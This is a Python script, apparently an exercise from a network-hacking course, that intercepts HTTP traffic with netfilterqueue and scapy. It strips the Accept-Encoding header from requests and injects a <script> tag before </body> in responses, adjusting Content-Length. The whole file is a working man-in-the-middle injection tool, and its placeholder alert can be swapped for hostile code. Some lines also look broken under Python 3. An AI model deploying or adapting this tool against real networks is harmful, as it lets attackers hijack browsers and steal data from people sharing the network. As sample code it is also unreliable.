#!/usr/bin/env python3
# Rebuild - uncommented
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""
ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
injection_code = "<script>alert('Test!'); </script>"

def set_load(packet, load):
    packet[Raw].load = load
    # For scapy to recalculate IP and Chksum for updated load, delete them
    # Making the change from del, to *= None, does not affect the results
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                print("[+] HTTP Request:  ")
                load = re.sub(
                    "Accept-Encoding:.*?\\r\\n",
                    "",
                    load,
                    flags=re.IGNORECASE | re.MULTILINE
                )

            elif scapy_packet[TCP].sport == 80:
                print("[+] HTTP Response:  ")
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(str(new_packet))

    packet.accept()

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
